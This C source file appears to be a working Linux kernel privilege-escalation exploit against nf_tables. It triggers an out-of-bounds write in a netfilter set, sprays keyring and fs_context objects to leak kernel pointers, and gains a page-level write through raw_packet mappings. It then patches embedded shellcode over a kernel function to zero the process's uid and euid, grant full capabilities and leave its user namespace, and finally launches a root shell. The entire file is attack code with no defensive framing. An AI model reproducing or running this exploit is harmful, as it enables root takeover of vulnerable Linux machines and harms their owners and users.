#define _GNU_SOURCE
#include <arpa/inet.h>
#include <limits.h>
#include <linux/netlink.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <unistd.h>

#include <linux/capability.h>
#include <sys/prctl.h>

#include "common.h"
#include "fsopen_spray.h"
#include "keyring.h"
#include "log.h"
#include "modprobe.h"
#include "nf_tables.h"
#include "raw_packet.h"

#define ID 1337
#define SET_NAME "nameXXX"
#define LEAK_SET_NAME "leakXXX"
#define TABLE_NAME "tableXX"

#define SPRAY_SIZE 10

struct leak_payload {
    uint8_t prefix[PREFIX_BUF_LEN];
    uint8_t rcu_buf[RCU_HEAD_LEN];
    uint16_t len;
} __attribute__((packed));

struct write_payload {
    uint8_t prefix[PREFIX_BUF_LEN];
    void *pg_vec;
} __attribute__((packed));

uint8_t shellcode[] = {
    // mov rax,0x4141414141414141 (cred ptr)
    0x48, 0xb8, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,

    // xor rdi, rdi
    0x48, 0x31, 0xff,

    // mov dword ptr [rax+4], edi (uid)
    // mov dword ptr [rax+20], edi (euid)
    0x89, 0x78, 0x04,
    0x89, 0x78, 0x14,

    // mov rdi, 0x000001ffffffffff
    0x48, 0xbf, 0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0x00, 0x00,

    // mov qword ptr [rax+0x28], rdi (cap_inheritable)
    // mov qword ptr [rax+0x30], rdi (cap_permitted)
    // mov qword ptr [rax+0x38], rdi (cap_effective)
    0x48, 0x89, 0x78, 0x28,
    0x48, 0x89, 0x78, 0x30,
    0x48, 0x89, 0x78, 0x38,

    // lea rdi, qword ptr [rax+136] (user_ns)
    // mov rsi, qword ptr [rdi]
    // mov rsi, qword ptr [rsi+216] (parent)
    // mov qword ptr [rdi], rsi
    0x48, 0x8d, 0xb8, 0x88, 0x00, 0x00, 0x00,
    0x48, 0x8b, 0x37,
    0x48, 0x8b, 0xb6, 0xd8, 0x00, 0x00, 0x00,
    0x48, 0x89, 0x37,

    0x48, 0x31, 0xc0, // xor rax,rax
    0xc3,             // ret
};

int netfilter_sock = -1;
struct leak_data leak_ptrs = {0};
int fsopen_fds[SPRAY_FS_CONTEXT_CNT] = {0};

void init_netfilter(void) {
    struct sockaddr_nl snl;

    logd("creating netfilter netlink socket");
    if ((netfilter_sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER)) < 0) {
        die("can't create netfilter socket: %m");
    }

    memset(&snl, 0, sizeof(snl));
    snl.nl_family = AF_NETLINK;
    snl.nl_pid = getpid();
    if (bind(netfilter_sock, (struct sockaddr *)&snl, sizeof(snl)) < 0) {
        die("bind: %m");
    }

    logd("register netfilter table");
    create_table(netfilter_sock, TABLE_NAME);

    logd("creating a netfilter set for the info leak");
    create_set(netfilter_sock, LEAK_SET_NAME, KMALLOC192_KEYLEN, sizeof(struct leak_payload), TABLE_NAME, ID);

    logd("creating a netfilter set for the write primitive");
    create_set(netfilter_sock, SET_NAME, KMALLOC192_KEYLEN, sizeof(struct write_payload), TABLE_NAME, ID + 1);
}

void do_init(void) {
    set_cpu_affinity(0, 0);
    init_namespace();
    init_netfilter();
}

int do_leak(void) {
    key_serial_t key_ids[SPRAY_KEY_CNT] = {0};
    key_serial_t corrupted_key_id = 0;

    struct leak_payload payload;
    memset(&payload, 0, sizeof(struct leak_payload));
    payload.len = CORRUPT_SIZE;

retry:
    logd("spraying user_key_payload ...");
    spray_keyring(key_ids, SPRAY_KEY_CNT);

    logd("free some key to create holes ...");
    for (int i = FREE_HOLE_BEGIN; i < SPRAY_KEY_CNT; i += FREE_HOLE_STEP) {
        release_key(key_ids[i]);
        key_ids[i] = 0;
    }

    logd("trigger oob write ...");
    add_elem_to_set(netfilter_sock, LEAK_SET_NAME, KMALLOC192_KEYLEN, TABLE_NAME,
                    ID, sizeof(struct leak_payload), (uint8_t *)&payload);

    logd("checking if keyring is corrupted ...");
    if (is_keyring_corrupted(key_ids, SPRAY_KEY_CNT, &corrupted_key_id)) {
        logi("found keyring %d is corrupted!", corrupted_key_id);
    } else {
        logw("can't found corrupted keyring, retry ...");
        release_keys(key_ids, SPRAY_KEY_CNT);
        goto retry;
    }

    logd("free other keyring to set rcu.func in user_key_payload ...");
    for (int i = FREE_HOLE_BEGIN; i < SPRAY_KEY_CNT; i++) {
        if (key_ids[i] == corrupted_key_id) {
            continue;
        }
        release_key(key_ids[i]);
        key_ids[i] = 0;
    }

    logd("spray struct fs_context in kmalloc-192 ...");
    spray_fs_context(fsopen_fds, SPRAY_FS_CONTEXT_CNT);

    logd("searching leak ...");
    if (get_keyring_leak(corrupted_key_id, &leak_ptrs)) {
        loge("can't find fs_context");
        for (int i = 0; i < SPRAY_KEY_CNT; i++) {
            release_key(key_ids[i]);
            key_ids[i] = 0;
        }
        close_fds(fsopen_fds, SPRAY_FS_CONTEXT_CNT);
        return 1;
    }

    logi("leak fs_context_ops: 0x%08lx", leak_ptrs.fs_context_ops);
    logi("leak cred_ptr: 0x%08lx", leak_ptrs.cred_ptr);

    return 0;
}

int do_write_primitive(void) {
    int not_found = 1;
    struct write_payload payload;

    /* Prepare the payload for the write primitive */
    memset(&payload, 0, sizeof(struct write_payload));
    if (!leak_ptrs.parse_param_fptr) {
        payload.pg_vec = (void *)(leak_ptrs.fs_context_ops & ~0xfff);
    } else {
        payload.pg_vec = (void *)(leak_ptrs.parse_param_fptr & ~0xfff);
    }

    int spray_page_fds[0x100];
    int page_fds[0x100];

    // fengshui
    for (int i = 0; i < 0x100; i++) {
        spray_page_fds[i] = pagealloc_pad(17, 0x1000);
    }

    memset(page_fds, 0, sizeof(page_fds));
    for (int i = 0; i < 0x100; i++) {
        page_fds[i] = pagealloc_pad(17, 0x1000);
    }

    for (int i = 0; i < 0x100; i += 0x20) {
        close(page_fds[i]);
        page_fds[i] = 0;
    }

    add_elem_to_set(netfilter_sock, SET_NAME, KMALLOC192_KEYLEN, TABLE_NAME, ID, sizeof(struct write_payload), (uint8_t *)&payload);

    // try to mmap raw_packet
    for (int i = 0; i < 0x100; i++) {
        if (!page_fds[i]) {
            continue;
        }
        char *p = (char *)mmap(NULL, 0x1000 * 17, PROT_READ | PROT_WRITE, MAP_SHARED, page_fds[i], 0);
        if (!p || (ssize_t)p < 0) {
            loge("mmap error: %p", p);
            continue;
        }
        int j;
        for (j = 0x30; j < 0x1000; j++) {
            if (p[j] != 0) {
                break;
            }
        }
        if (j != 0x1000) {
            logi("found target page!!");
            if (!leak_ptrs.parse_param_fptr) {
                uint64_t *pos = (uint64_t *)&p[leak_ptrs.fs_context_ops & 0xfff];
                leak_ptrs.parse_param_fptr = pos[2];
                logi("leak parse_param: 0x%08lx", leak_ptrs.parse_param_fptr);

            } else {
                uint64_t *pos = (uint64_t *)&p[leak_ptrs.parse_param_fptr & 0xfff];

                uint8_t backup[sizeof(shellcode)] = {0};

                *(uint64_t *)(shellcode + 2) = leak_ptrs.cred_ptr; // patch cred_ptr

                logd("write shellcode:");
                hexdump(shellcode, sizeof(shellcode));

                memcpy(backup, pos, sizeof(backup));
                memcpy(pos, shellcode, sizeof(shellcode));

                fsconfig(fsopen_fds[0], FSCONFIG_SET_STRING, "\x00", "AAAA", 0);

                memcpy(pos, backup, sizeof(backup));
            }

            not_found = 0;
            break;
        }
    }

    for (int i = 0; i < 0x100; i++) {
        if (spray_page_fds[i]) {
            close(spray_page_fds[i]);
        }
    }

    for (int i = 0; i < 0x100; i++) {
        if (page_fds[i]) {
            close(page_fds[i]);
        }
    }

    return not_found;
}

int main(int argc, char **argv) {
    logd("initialize exploit environment ...");
    do_init();

    while (do_leak()) {
        usleep(100 * 1000);
        logw("retry ...");
    }

    // leak func ptr
    while (do_write_primitive()) {
        usleep(100 * 1000);
        logw("retry ...");
    }

    // write shellcode
    while (do_write_primitive()) {
        usleep(100 * 1000);
        logw("retry ...");
    }

    logd("uid=%d, euid=%d", getuid(), geteuid());
    execl("/bin/sh", "sh", NULL);

    return 0;
}
